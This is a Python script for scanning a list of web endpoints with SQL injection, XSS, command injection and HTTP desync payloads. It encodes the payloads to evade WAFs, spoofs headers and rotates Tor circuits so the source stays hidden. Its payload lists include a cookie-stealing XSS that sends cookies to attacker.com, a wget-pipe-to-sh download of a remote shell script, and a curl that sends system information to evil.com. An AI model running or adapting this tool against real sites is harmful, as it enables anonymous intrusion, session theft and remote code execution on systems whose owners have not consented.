import requests
import random
import time
import stem
import stem.control
from urllib.parse import urlencode
from websocket import create_connection, WebSocketException
from http.client import HTTPException
import base64

# Tor configuration
TOR_SOCKS5_PROXY = "socks5h://127.0.0.1:9050"
TOR_CONTROL_PORT = "9051"
TOR_PASSWORD = "Passw0rd"

# Payloads for evasion and complexity
sqli_payloads = [
    "' OR '1'='1' --",
    "admin'--",
    "UNION SELECT username, password FROM users WHERE '1'='1",
    "1; EXEC xp_cmdshell('ping 127.0.0.1') --",
    "AND IF(ASCII(SUBSTRING((SELECT @@version),1,1))>51,SLEEP(5),0)--"
]

xss_payloads = [
    "<img src='x' onerror='alert(1)'>",
    "<svg/onload=alert(document.domain)>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<body onload='fetch(`http://attacker.com?cookie=`+document.cookie)'>",
]

http_desync_payloads = [
    "0\r\n\r\nTRACE / HTTP/1.1\r\nHost: vulnerable.site\r\n",
    "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\n\r\nTRACE",
    "TRACE / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 0\r\n\r\n",
]

rce_payloads = [
    "`; wget http://malicious.com/shell.sh | sh;`",
    "$(curl http://evil.com -d `uname -a`)",
    "1 && nslookup attacker.com; #",
]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
]

http_methods = ['GET', 'POST', 'OPTIONS', 'TRACE']

def encode_payload(payload, encoding_type="default"):
    """Encode the payload in different formats to evade WAFs."""
    if encoding_type == "url":
        return urlencode({'': payload})[1:]
    elif encoding_type == "base64":
        return base64.b64encode(payload.encode()).decode()
    elif encoding_type == "hex":
        return ''.join(f"%{hex(ord(char))[2:]}" for char in payload)
    else:
        return payload

def get_random_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
        "Referer": "https://www.google.com",
    }

def renew_tor_circuit():
    """Renew the Tor circuit to get a new IP address and log any issues."""
    try:
        with stem.control.Controller.from_port(port=int(TOR_CONTROL_PORT)) as controller:
            controller.authenticate(password=TOR_PASSWORD)
            controller.signal(stem.Signal.NEWNYM)
            print("Tor circuit renewed.")
        time.sleep(5)
    except Exception as e:
        print(f"Error renewing Tor circuit: {e}")

def send_request(session, url, headers, method='GET', payload=None, retries=3, delay=2):
    """Send HTTP requests with retries and handle various exceptions."""
    for attempt in range(retries):
        try:
            time.sleep(random.uniform(delay, delay + 2))
            if method == 'POST':
                response = session.post(url, headers=headers, data=payload, timeout=10)
            else:
                response = session.request(method, url, headers=headers, timeout=10)
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            print(f"HTTP error with {url}: {e}")
            if response.status_code == 429:
                print("Too many requests. Pausing to avoid further rate limiting.")
                time.sleep(10)
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout) as e:
            print(f"Connection/Timeout error on attempt {attempt + 1} with {url}: {e}")
            time.sleep(5)
        except requests.exceptions.RequestException as e:
            print(f"Request error on attempt {attempt + 1} with {url}: {e}")
        time.sleep(2)
    return None

def send_via_websocket(url, payload, retries=3):
    """Send payload over WebSocket and handle WebSocket-specific errors."""
    ws_url = url.replace("http", "ws")
    for attempt in range(retries):
        try:
            ws = create_connection(ws_url)
            ws.send(payload)
            result = ws.recv()
            ws.close()
            return result
        except WebSocketException as e:
            print(f"WebSocket error on attempt {attempt + 1} with {url}: {e}")
            time.sleep(5) 
        except Exception as e:
            print(f"Unknown error in WebSocket connection on attempt {attempt + 1}: {e}")
        time.sleep(2)
    return None

def generate_curl_command(url, headers, payload, method='GET'):
    """Generate a `curl` command for manual testing of the detected vulnerability."""
    curl_cmd = f"curl -X {method} '{url}'"
    for key, value in headers.items():
        curl_cmd += f" -H '{key}: {value}'"
    if payload:
        curl_cmd += f" --data '{payload}'"
    return curl_cmd

def test_payload(session, endpoint, payload, payload_type, log_file, method='GET', encoding='default'):
    """Test single payload, handle exceptions, and log if vulnerable."""
    encoded_payload = encode_payload(payload, encoding)
    test_url = f"{endpoint}?{urlencode({'param': encoded_payload})}"
    headers = get_random_headers()
    
    if payload_type == "HTTP Desync":
        result = send_via_websocket(test_url, encoded_payload)
    else:
        result = send_request(session, test_url, headers, method, encoded_payload)

    if result and (encoded_payload in result.text or (result.elapsed and result.elapsed.total_seconds() > 5)):
        curl_command = generate_curl_command(test_url, headers, encoded_payload, method)
        with open(log_file, "a") as f:
            f.write(f"[{payload_type}] Vulnerable: {test_url}\nCurl: {curl_command}\n\n")
        return True

    return False

def scan_endpoints(filename):
    """Scan endpoints from file and log results by vulnerability type, handling errors."""
    session = requests.Session()
    session.proxies = {"http": TOR_SOCKS5_PROXY, "https": TOR_SOCKS5_PROXY}
    
    with open(filename, "r") as f:
        endpoints = f.readlines()
    
    log_files = {
        "SQLi": "res_sqli.txt",
        "XSS": "res_xss.txt",
        "RCE": "res_rce.txt",
        "HTTP Desync": "res_http_desync.txt"
    }

    for log_file in log_files.values():
        with open(log_file, "w") as f:
            f.write("Vulnerability Scan Results\n")
            f.write("=" * 40 + "\n\n")

    request_counter = 0
    for endpoint in endpoints:
        endpoint = endpoint.strip()
        if not endpoint:
            continue

        print(f"Scanning {endpoint}...")

        for payload_type, (payloads, log_file) in {
            "SQLi": (sqli_payloads, log_files["SQLi"]),
            "XSS": (xss_payloads, log_files["XSS"]),
            "RCE": (rce_payloads, log_files["RCE"]),
            "HTTP Desync": (http_desync_payloads, log_files["HTTP Desync"])
        }.items():
            for payload in payloads:
                method = random.choice(http_methods)
                encoding = random.choice(['default', 'url', 'base64', 'hex'])
                vulnerability_found = test_payload(session, endpoint, payload, payload_type, log_file, method, encoding)
                
                if vulnerability_found:
                    print(f"[{payload_type}] Vulnerability found on {endpoint} with payload: {payload} (method: {method}, encoding: {encoding})")

        request_counter += 1
        if request_counter % 5 == 0:
            print("Renewing Tor circuit...")
            renew_tor_circuit()

scan_endpoints("endpoints.txt")
